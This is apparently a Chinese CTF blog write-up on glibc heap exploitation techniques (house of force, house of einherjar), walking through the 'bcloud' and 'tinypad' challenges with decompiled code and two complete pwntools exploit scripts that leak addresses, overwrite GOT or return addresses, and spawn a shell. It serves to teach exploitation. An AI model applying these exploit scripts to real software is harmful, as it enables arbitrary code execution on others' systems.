<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">void welcom_user()</div><div class="line">&#123;</div><div class="line">  char s; // [esp+1Ch] [ebp-5Ch]</div><div class="line">  char *v2; // [esp+5Ch] [ebp-1Ch]</div><div class="line">  unsigned int v3; // [esp+6Ch] [ebp-Ch]</div><div class="line"></div><div class="line">  memset(&amp;s, 0, 0x50u);</div><div class="line">  puts(&quot;Input your name:&quot;);</div><div class="line">  read_buffer((int)&amp;s, 0x40, &apos;\n&apos;);</div><div class="line">  v2 = (char *)malloc(0x40u);</div><div class="line">  name = (int)v2;</div><div class="line">  strcpy(v2, &amp;s);</div><div class="line">  welcom((int)v2);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看上面的注释，计算出v2变量和s变量在栈中的距离为0x40</p>
<p>当我输入0x40的a时，会把变量s填充满，然后在v1的第一个字节添加字符串结尾<code>\x00</code>，接下来，malloc的返回值赋给v2，把<code>\x00</code>给覆盖掉了，所以在strcpy函数把s的值+v2的值copy到v2指向的堆中，然后在welcom函数中输出，这样获得到了堆的地址</p>
<h2 id="修改top-chunk-size"><a href="#修改top-chunk-size" class="headerlink" title="修改top_chunk size"></a>修改top_chunk size</h2><p>之后，有一个输入org和host的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">void sub_804884E()</div><div class="line">&#123;</div><div class="line">  char org; // [esp+1Ch] [ebp-9Ch]</div><div class="line">  char *v1; // [esp+5Ch] [ebp-5Ch]</div><div class="line">  int host; // [esp+60h] [ebp-58h]</div><div class="line">  char *v3; // [esp+A4h] [ebp-14h]</div><div class="line">  unsigned int v4; // [esp+ACh] [ebp-Ch]</div><div class="line"></div><div class="line">  memset(&amp;org, 0, 0x90u);</div><div class="line">  puts(&quot;Org:&quot;);</div><div class="line">  read_buffer((int)&amp;org, 0x40, 10);</div><div class="line">  puts(&quot;Host:&quot;);</div><div class="line">  read_buffer((int)&amp;host, 0x40, 10);</div><div class="line">  v3 = (char *)malloc(0x40u);</div><div class="line">  v1 = (char *)malloc(0x40u);</div><div class="line">  org_static = (int)v1;</div><div class="line">  host_static = (int)v3;</div><div class="line">  strcpy(v3, (const char *)&amp;host);</div><div class="line">  strcpy(v1, &amp;org);</div><div class="line">  puts(&quot;OKay! Enjoy:)&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数存在和上面user函数一样的问题，我们来看看栈布局：</p>
<table>
<thead>
<tr>
<th style="text-align:center">org size=0x40</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">v1 size=0x4</td>
</tr>
<tr>
<td style="text-align:center">host size=0x40</td>
</tr>
<tr>
<td style="text-align:center">v3 size=0x4</td>
</tr>
</tbody>
</table>
<p>然后再来看看malloc两次后的堆布局：</p>
<table>
<thead>
<tr>
<th style="text-align:center">user size=0x49</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">v3 size=0x49</td>
</tr>
<tr>
<td style="text-align:center">v1 size=0x49</td>
</tr>
<tr>
<td style="text-align:center">top_chunk size=???</td>
</tr>
</tbody>
</table>
<p>v1储存的是org的值，如果org中没有<code>\x00</code>，v1中没有<code>\x00</code>，strcpy将会copy org+v1+host的值到堆中去，而堆中v1的size只有0x48，所以会导致堆溢出，可以覆盖到top_chunk的size，我们将该size赋值为0xffffffff</p>
<h2 id="控制malloc的返回值"><a href="#控制malloc的返回值" class="headerlink" title="控制malloc的返回值"></a>控制malloc的返回值</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">int new()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  signed int i; // [esp+18h] [ebp-10h]</div><div class="line">  int v2; // [esp+1Ch] [ebp-Ch]</div><div class="line"></div><div class="line">  for ( i = 0; i &lt;= 9 &amp;&amp; note_list[i]; ++i )</div><div class="line">    ;</div><div class="line">  if ( i == 10 )</div><div class="line">    return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;);</div><div class="line">  puts(&quot;Input the length of the note content:&quot;);</div><div class="line">  v2 = get_int();</div><div class="line">  note_list[i] = (int)malloc(v2 + 4);</div><div class="line">  if ( !note_list[i] )</div><div class="line">    exit(-1);</div><div class="line">  note_length[i] = v2;</div><div class="line">  puts(&quot;Input the content:&quot;);</div><div class="line">  read_buffer(note_list[i], v2, 10);</div><div class="line">  printf(&quot;Create success, the id is %d\n&quot;, i);</div><div class="line">  result = i;</div><div class="line">  dword_804B0E0[i] = 0;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在new函数中，可以控制malloc的size大小，然后我们需要考虑控制malloc跳到哪里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int edit()</div><div class="line">&#123;</div><div class="line">  int length;</div><div class="line">  int id; // [esp+14h] [ebp-14h]</div><div class="line">  int note; // [esp+18h] [ebp-10h]</div><div class="line"></div><div class="line">  puts(&quot;Input the id:&quot;);</div><div class="line">  id = get_int();</div><div class="line">  if ( id &lt; 0 || id &gt; 9 )</div><div class="line">    return puts(&quot;Invalid ID.&quot;);</div><div class="line">  note = note_list[id];</div><div class="line">  if ( !note )</div><div class="line">    return puts(&quot;Note has been deleted.&quot;);</div><div class="line">  length = note_length[id];</div><div class="line">  dword_804B0E0[id] = 0;</div><div class="line">  puts(&quot;Input the new content:&quot;);</div><div class="line">  read_buffer(note, length, 10);</div><div class="line">  return puts(&quot;Edit success.&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>有一个edit函数，可以编辑note_list指向地址的值，所以如果我们能控制note_list的值，就可以做到任意地址修改</p>
<p>所以我们的目的是让下一次malloc的返回值为<code>0x804B120</code>，这样需要在这一次malloc后，让<code>top_chunk=0x804B118</code></p>
<p>所以根据泄露出的heap地址计算出当前top_chunk的地址，然后再计算出本次malloc的size: <code>0x10804B118-top_chunk</code> 或者 <code>-(top_chunk-0x804B118)</code></p>
<h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2><p>按照该程序的逻辑，应该在show函数中成输出note_list指向地址的值，但是该函数的功能还未实现:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int show()</div><div class="line">&#123;</div><div class="line">  return puts(&quot;WTF? Something strange happened.&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以就需要想别的办法来泄露libc地址了</p>
<p>我使用的方法的修改free_got的值为printf的值，然后在delete函数中，<code>free(note_list[x])</code>，<code>note_list[x]</code>修改成atoi_got的地址，这样就能泄露出atoi_got的值</p>
<p>但是因为不知道libc，所以不知道printf的值，但是因为有延时绑定，所以我们能把free_got的值修改成printf_plt+6的值</p>
<p>获取到libc的地址后，可以计算出system的值，然后再把atoi_got的值修改成system地址，达到getshell的目的</p>
<p>完整payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2.7</div><div class="line"># -*- coding=utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">def new_note(len,content):</div><div class="line">    p.readuntil(&quot;---&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.readuntil(&quot;content:&quot;)</div><div class="line">    p.sendline(str(len))</div><div class="line">    p.readuntil(&quot;content:&quot;)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line">def edit_note(i, data):</div><div class="line">    p.readuntil(&quot;---&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line">    p.readuntil(&quot;id:\n&quot;)</div><div class="line">    p.sendline(str(i))</div><div class="line">    p.readuntil(&quot;content:\n&quot;)</div><div class="line">    p.sendline(data)</div><div class="line">    p.readuntil(&quot;success.&quot;)</div><div class="line"></div><div class="line">def delete_note(i):</div><div class="line">    p.readuntil(&quot;---&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line">    p.readuntil(&quot;id:\n&quot;)</div><div class="line">    p.sendline(str(i))</div><div class="line"></div><div class="line">p = process(&quot;./bcloud&quot;)</div><div class="line">e = ELF(&quot;./bcloud&quot;)</div><div class="line">libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"># leak heap</div><div class="line">p.readuntil(&quot;name:\n&quot;)</div><div class="line">p.send(&quot;a&quot;*0x40)</div><div class="line">p.read(0x44)</div><div class="line">heap = u32(p.read(4))</div><div class="line">print &quot;heap addr: &quot; + hex(heap)</div><div class="line"></div><div class="line"># modify top chunk size to 0xffffffff</div><div class="line">p.readuntil(&quot;Org:&quot;)</div><div class="line">p.send(&quot;a&quot;*0x40)</div><div class="line">p.readuntil(&quot;Host:&quot;)</div><div class="line">p.sendline(p32(0xffffffff))</div><div class="line">p.readuntil(&quot;Enjoy:&quot;)</div><div class="line"></div><div class="line"># malloc return address:0x804B120</div><div class="line">note_list = 0x804B120</div><div class="line">new_note(0x10, &quot;aaa&quot;)</div><div class="line">new_note(-(heap+0xf4-0x804B120+8), &quot;2333&quot;)</div><div class="line"></div><div class="line"># note_list[0] = free_got</div><div class="line"># note_list[1] = atoi_got</div><div class="line"># note_list[2] = atoi_got</div><div class="line">payload = p32(e.got[&quot;free&quot;])</div><div class="line">payload += p32(e.got[&quot;atoi&quot;])</div><div class="line">payload += p32(e.got[&quot;atoi&quot;])</div><div class="line">new_note(0x100, payload)</div><div class="line"></div><div class="line"># write printf address to free_got</div><div class="line">edit_note(0, p32(e.symbols[&quot;printf&quot;]+6))</div><div class="line"></div><div class="line"># printf(atoi_got)</div><div class="line">delete_note(1)</div><div class="line">atoi_libc = u32(p.read(4))</div><div class="line">p.readuntil(&quot;success.&quot;)</div><div class="line">libc_base = atoi_libc - libc.symbols[&quot;atoi&quot;]</div><div class="line">print &quot;libc_base: &quot; + hex(libc_base)</div><div class="line"></div><div class="line"># calculate system address</div><div class="line">system = libc.symbols[&quot;system&quot;] + libc_base</div><div class="line"></div><div class="line"># write system address to atoi_got</div><div class="line">edit_note(2, p32(system))</div><div class="line"></div><div class="line"># system(&quot;/bin/sh&quot;)</div><div class="line">p.sendline(&quot;/bin/sh&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><p>house of einherjar跟house of force差不多，最终目的都是控制top chunk的值，利用demo可参考: <a href="https://github.com/shellphish/how2heap/blob/master/house_of_einherjar.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/house_of_einherjar.c</a></p>
<p>题目见: <a href="https://github.com/blendin/writeups/tree/master/2016/tinypad" target="_blank" rel="external">https://github.com/blendin/writeups/tree/master/2016/tinypad</a></p>
<p>和house of force的区别是，通过off by one把最后一个chunk的pre_inuse标志位置零，让free函数以为上一个chunk已经被free，这就要求了最后一个chunk的size必须要是0x100的倍数，要不然会check下一个chunk失败，或者和top chunk进行合并操作的时候失败。</p>
<p>然后再伪造一个chunk，计算最后一个chunk到我们伪造chunk的距离，设置为最后一个chunk的pre_size位，当free最后一个chunk时，会将伪造的chunk和当前chunk和top chunk进行unlink操作，合并成一个top chunk，从而达到将top chunk设置到我们伪造chunk的地址。</p>
<p>接下来通过2016年Second ctf的一个题来加深对该利用方法的理解：</p>
<h2 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if ( *(_QWORD *)&amp;tinypad[16 * (v11 - 1 + 16LL)] )</div><div class="line">&#123;</div><div class="line">    free(*(void **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8]);</div><div class="line">    *(_QWORD *)&amp;tinypad[16 * (v11 - 1 + 16LL)] = 0LL;</div><div class="line">    writeln((__int64)&quot;\nDeleted.&quot;, 9LL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在free了一个tinypad的时候，只把size位置零了，但是却没有把储存content的地址(<code>tinypad[16 * (v11 - 1 + 16LL) + 8]</code>)置零</p>
<p>然后在每次循环的时候，都会输出四个tinypad的信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">for ( i = 0; i &lt;= 3; ++i )</div><div class="line">    &#123;</div><div class="line">      LOBYTE(c) = i + &apos;1&apos;;</div><div class="line">    writeln((__int64)&quot;+------------------------------------------------------------------------------+\n&quot;, 81LL);</div><div class="line">      write_n((__int64)&quot; #   INDEX: &quot;, 12LL);</div><div class="line">      writeln((__int64)&amp;c, 1LL);</div><div class="line">      write_n((__int64)&quot; # CONTENT: &quot;, 12LL);</div><div class="line">      if ( *(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8] )</div><div class="line">      &#123;</div><div class="line">        v3 = strlen(*(const char **)&amp;tinypad[16 * (i + 16LL) + 8]);</div><div class="line">        writeln(*(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8], v3);</div><div class="line">      &#125;</div><div class="line">      writeln((__int64)&amp;newline, 1LL);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>所以我们能增加4个tinypad，都申请一个0x100左右的chunk，然后释放第1个和第3个，这样就能形成unsortbin双链表，其中一个fd指向arena区域，一个fd指向另一个chunk，这样就泄露出了libc地址和堆地址</p>
<h2 id="house-of-einherjar利用"><a href="#house-of-einherjar利用" class="headerlink" title="house of einherjar利用"></a>house of einherjar利用</h2><p>首先是伪造一个合法的chunk，我们发现在edit分支，能控制<code>tinypad</code>地址的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">if ( *(_QWORD *)&amp;tinypad[16 * (v11 - 1 + 16LL)] )</div><div class="line">        &#123;</div><div class="line">          c = &apos;0&apos;;</div><div class="line">          strcpy(tinypad, *(const char **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8]);</div><div class="line">          while ( toupper(c) != &apos;Y&apos; )</div><div class="line">          &#123;</div><div class="line">            write_n((__int64)&quot;CONTENT: &quot;, 9LL);</div><div class="line">            v6 = strlen(tinypad);</div><div class="line">            writeln((__int64)tinypad, v6);</div><div class="line">            write_n((__int64)&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</div><div class="line">            v7 = strlen(*(const char **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8]);</div><div class="line">            read_until((__int64)tinypad, v7, &apos;\n&apos;);        # 控制tinypad的值</div><div class="line">            writeln((__int64)&quot;Is it OK?&quot;, 9LL);</div><div class="line">            write_n((__int64)&quot;(Y/n)&gt;&gt;&gt; &quot;, 9LL);</div><div class="line">            read_until((__int64)&amp;c, 1uLL, 0xAu);</div><div class="line">          &#125;</div><div class="line">          strcpy(*(char **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8], tinypad);</div><div class="line">          writeln((__int64)&quot;\nEdited.&quot;, 8LL);</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<p>所以我们tinypad就是我们伪造的chunk，伪造的chunk如下：</p>
<p><code>&amp;tinypad</code>:</p>
<table>
<thead>
<tr>
<th style="text-align:center">pre_size(0x100)</th>
<th style="text-align:center">size(待会计算)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">fwd(&amp;tinypad)</td>
<td style="text-align:center">bck(&amp;tinypad)</td>
</tr>
<tr>
<td style="text-align:center">fwd_nextsize(&amp;tinypad)</td>
<td style="text-align:center">bck_nextsize(&amp;tinypad)</td>
</tr>
</tbody>
</table>
<p>刚才泄露内存已经释放了两个tinypad，还剩第二个和第四个tinypad，这个时候我释放第四个tinypad，这样第三个第四个将会和top_chunk合并</p>
<p>只要经过精心计算，这个时候我们再add一个tinypad，将会获得第一个tinypad(已经被释放)的堆地址，然后利用off by one漏洞:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">unsigned __int64 read_until(__int64 buf, unsigned __int64 len, unsigned int end)</div><div class="line">&#123;</div><div class="line">  int v4; // [rsp+Ch] [rbp-34h]</div><div class="line">  unsigned __int64 i; // [rsp+28h] [rbp-18h]</div><div class="line">  signed __int64 v6; // [rsp+30h] [rbp-10h]</div><div class="line"></div><div class="line">  v4 = end;</div><div class="line">  for ( i = 0LL; i &lt; len; ++i )</div><div class="line">  &#123;</div><div class="line">    v6 = read_n(0, buf + i, 1uLL);</div><div class="line">    if ( v6 &lt; 0 )</div><div class="line">      return -1LL;</div><div class="line">    if ( !v6 || *(char *)(buf + i) == v4 )</div><div class="line">      break;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)(buf + i) = 0;           // off by one</div><div class="line">  if ( i == len &amp;&amp; *(_BYTE *)(len - 1 + buf) != 10 )</div><div class="line">    dummyinput(v4);</div><div class="line">  return i;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>比如tinypad 1的大小是<code>0xf0</code>，我们申请一个<code>0xe8</code>大小的内存，就会得到tinypad 1的堆，然后可以覆盖到tinypad 2的<code>pre_size</code>，如果tinypad2的size位是0x101，则会被off by one漏洞设置为0x100</p>
<p>我们计算出tinypad2的地址，然后减去tinypad的地址，计算出offset，设置为tinypad2的pre_size和伪造chunk的size位</p>
<p>然后我们再free tinypad2，伪造的chunk和tinypad2将会和top chunk合并，这个时候top chunk的值为tinypad的地址</p>
<h2 id="bypass-Full-RELRO"><a href="#bypass-Full-RELRO" class="headerlink" title="bypass Full RELRO"></a>bypass Full RELRO</h2><p>top chunk已经被设置到tinypad地址了，tinypad+256地址开始储存着tinypad1 2 3 4的信息，所以当我们再次malloc的时候，tinypad 1 2 3 4的size和address都已经是可控的了，可以达到任意地址读，然后edit功能可以做到任意地址写</p>
<p>已经能任意地址读写了，正常思路就是写got表，然后getshell，但是发现程序开启了Full RELRO保护，got表将不可写</p>
<p>然后考虑了FILE_IO的利用方法，但是发现该程序的IO使用的都是read和write，并没有使用stdio库，故该思路也不可行</p>
<p>然后发现，在libc中有一个全局变量<code>__environ</code>, 储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址，所以可以控制rip了</p>
<p>我使用的思路是，计算出one_gadget的地址，然后把<code>ret __libc_start_main</code>改写成<code>ret one_gadget</code>，从而达到getshell的目的。</p>
<p>完整Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2</div><div class="line"># -*- coding=utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line"></div><div class="line">def add(p, size, content):</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;a&quot;)</div><div class="line">    p.readuntil(&quot;(SIZE)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(str(size))</div><div class="line">    p.readuntil(&quot;(CONTENT)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line">def delete(p, index):</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;d&quot;)</div><div class="line">    p.readuntil(&quot;(INDEX)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(str(index))</div><div class="line"></div><div class="line">def edit(p, index, content):</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;e&quot;)</div><div class="line">    p.readuntil(&quot;(INDEX)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(str(index)) </div><div class="line">    p.readuntil(&quot;(CONTENT)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(content)</div><div class="line">    p.readuntil(&quot;(Y/n)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;y&quot;)</div><div class="line"></div><div class="line">def main():</div><div class="line">    # context.log_level = &quot;debug&quot;</div><div class="line">    p = process(&quot;./tinypad&quot;)</div><div class="line">    # e = ELF(&quot;./tinypad&quot;)</div><div class="line">    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</div><div class="line"></div><div class="line">    # leak libc and heap address</div><div class="line">    add(p, 224, &quot;a&quot;*10)</div><div class="line">    add(p, 246, &quot;b&quot;*0xf0)</div><div class="line">    add(p, 256, &quot;c&quot;*0xf0)</div><div class="line">    add(p, 256, &quot;d&quot;*10)</div><div class="line">    delete(p, 3)</div><div class="line">    delete(p, 1)</div><div class="line">    # get heap address</div><div class="line">    p.readuntil(&quot;# CONTENT: &quot;)</div><div class="line">    heap = p.readline().rstrip()</div><div class="line">    heap += &quot;\x00&quot;*(8-len(heap))</div><div class="line">    heap_base = u64(heap) - 0x1f0</div><div class="line">    print &quot;heap_base address: &quot; + hex(heap_base)</div><div class="line">    # get libc address</div><div class="line">    p.readuntil(&quot;INDEX: 3&quot;)</div><div class="line">    p.readuntil(&quot;# CONTENT: &quot;)</div><div class="line">    libc_address = p.readline().strip()</div><div class="line">    libc_address += &quot;\x00&quot;*(8-len(libc_address))</div><div class="line">    libc_base = u64(libc_address) - 0x3c4b78</div><div class="line">    print &quot;libc_base address: &quot; + hex(libc_base)</div><div class="line"></div><div class="line">    # make top -&gt; tinypad(0x602040)</div><div class="line">    add(p, 232, &quot;g&quot;*224 + p64(heap_base+240-0x602040))</div><div class="line">    delete(p, 4)</div><div class="line">    payload = p64(0x100) + p64(heap_base+240-0x602040) + p64(0x602040)*4</div><div class="line">    edit(p, 2, payload)</div><div class="line">    delete(p, 2)</div><div class="line"></div><div class="line">    # modify free_hook -&gt; one_gadget</div><div class="line">    gadget1 = 0xf1117</div><div class="line">    gadget2 = 0xf0274</div><div class="line">    gadget3 = 0xcd1c8</div><div class="line">    gadget4 = 0xcd0f3</div><div class="line">    gadget5 = 0x4526a</div><div class="line">    gadget6 = 0xf66c0</div><div class="line">    gadget_address = libc_base + gadget1</div><div class="line">    add(p, 0xe0, &quot;t&quot;*0xd0)</div><div class="line"></div><div class="line">    payload = p64(232) + p64(libc_base + libc.symbols[&quot;__environ&quot;])</div><div class="line">    payload += p64(232) + p64(0x602148)</div><div class="line">    add(p, 0x100, payload)</div><div class="line">    p.readuntil(&quot;# CONTENT: &quot;)</div><div class="line">    stack = p.read(6)</div><div class="line">    stack += &quot;\x00&quot;*(8-len(stack))</div><div class="line">    stack_env = u64(stack)</div><div class="line">    print &quot;env_stack address: &quot; + hex(stack_env)</div><div class="line">    # pause()</div><div class="line">    edit(p, 2, p64(stack_env-240))</div><div class="line">    edit(p, 1, p64(gadget_address))</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;Q&quot;)</div><div class="line">    p.interactive()</div><div class="line">    </div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇文章分析了</p>
<ul>
<li>house of spirit</li>
<li>house_of_force</li>
<li>house_of_einherjar</li>
</ul>
<p>三种利用方法，还剩两种</p>
<ul>
<li>house_of_orange</li>
<li>house_of_lore</li>
</ul>
<p>其中，<code>house_of_lore</code>没发现有具体的实例题目，所以暂时不做研究</p>
<p>而<code>house_of_orange</code>涉及的知识点过多，所以会单独写一篇</p>
<p>house of系列第一次出现是<code>Phrack</code>2009年的杂志上，一共出现了下面几种：</p>
<ul>
<li>The House of Mind</li>
<li>The House of Prime</li>
<li>The House of Spirit</li>
<li>The House of Force</li>
<li>The House of Lore</li>
</ul>
<p>最后三种在how2heap上都有，前面两种，下次再说</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">https://github.com/shellphish/how2heap</a></li>
